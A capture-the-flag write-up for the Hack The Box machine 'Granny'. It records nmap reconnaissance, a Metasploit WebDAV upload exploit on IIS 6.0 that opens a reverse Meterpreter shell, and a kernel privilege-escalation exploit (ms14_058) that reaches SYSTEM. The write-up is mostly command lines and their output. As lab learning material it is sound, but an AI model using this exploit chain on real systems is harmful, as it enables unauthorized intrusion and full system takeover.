# GRANNY

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/granny]
└─$ nmap 10.10.10.15                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 02:40 EDT
Nmap scan report for 10.10.10.15
Host is up (0.28s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
                                                                                               
┌──(kali㉿kali)-[~/Downloads/hackthebox/granny]
└─$ nmap 10.10.10.15 -p 80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 02:41 EDT
Nmap scan report for 10.10.10.15
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Fri, 08 Oct 2021 06:54:45 GMT
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/granny1.png)

Using gobuster we find /images directory but it's empty.

## EXPLOIT

I searched for a exploit for windows iis on metasploit and got quite a few of them.
After a few not working properly I found the one that worked for me.

```bash
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Checking /metasploit125422500.asp
[*] Uploading 610968 bytes to /metasploit125422500.txt...
[*] Moving /metasploit125422500.txt to /metasploit125422500.asp...
[*] Executing /metasploit125422500.asp...
[*] Deleting /metasploit125422500.asp (this doesn't always work)...
[*] Sending stage (175174 bytes) to 10.10.10.15
[!] Deletion failed on /metasploit125422500.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.15:1030) at 2021-10-08 04:14:33 -0400

meterpreter >
```

## PRIVESEC

I used another metasploit module to check if the machine was vulnerable to any local exploits for privesec.

```bash
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 38 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

I chose a exploit at random.

```bash 
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set SESSION 1
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set LHOST tun0
msf6 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Launching notepad to host the exploit...
[+] Process 3028 launched.
[*] Reflectively injecting the exploit DLL into 3028...
[*] Injecting exploit into 3028...
[*] Exploit injected. Injecting payload into 3028...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.2:4444 -> 10.10.10.15:1031) at 2021-10-08 04:20:18 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now we can get user.txt and root.txt

